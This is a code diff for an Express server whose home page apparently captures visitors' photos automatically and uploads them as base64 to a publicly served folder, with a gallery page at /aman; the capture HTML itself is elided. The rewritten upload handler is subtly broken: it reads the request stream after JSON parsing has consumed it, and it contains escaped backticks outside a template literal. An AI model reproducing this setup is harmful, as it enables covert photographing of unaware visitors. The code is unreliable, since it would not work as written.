@@ -1,20 +1,17 @@
-import express from "express";
-import fs from "fs";
-import path from "path";
+const express = require("express");
+const fs = require("fs");
+const path = require("path");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const __dirname = process.cwd();
 const uploadDir = path.join(__dirname, "photos");
 if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
 
 app.use(express.json({ limit: "10mb" }));
-
-// ✅ serve photos folder
 app.use("/photos", express.static(uploadDir));
 
-// ✅ Home (auto photo capture page)
+// ✅ Home page
 app.get("/", (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -71,7 +68,7 @@ app.get("/", (req, res) => {
   `);
 });
 
-// ✅ Gallery page (/aman)
+// ✅ Gallery page
 app.get("/aman", (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -117,14 +114,19 @@ app.get("/aman", (req, res) => {
   `);
 });
 
-// ✅ Upload photo (base64)
+// ✅ Upload photo
 app.post("/upload-base64", (req, res) => {
   try {
-    const imgData = req.body.image;
-    const buffer = Buffer.from(imgData.split(",")[1], "base64");
-    const filename = \`photo-\${Date.now()}.png\`;
-    fs.writeFileSync(path.join(uploadDir, filename), buffer);
-    res.json({ success: true, filename });
+    let body = "";
+    req.on("data", chunk => body += chunk);
+    req.on("end", () => {
+      const parsed = JSON.parse(body);
+      const imgData = parsed.image;
+      const buffer = Buffer.from(imgData.split(",")[1], "base64");
+      const filename = \`photo-\${Date.now()}.png\`;
+      fs.writeFileSync(path.join(uploadDir, filename), buffer);
+      res.json({ success: true, filename });
+    });
   } catch {
     res.status(500).json({ error: "Upload failed" });
   }
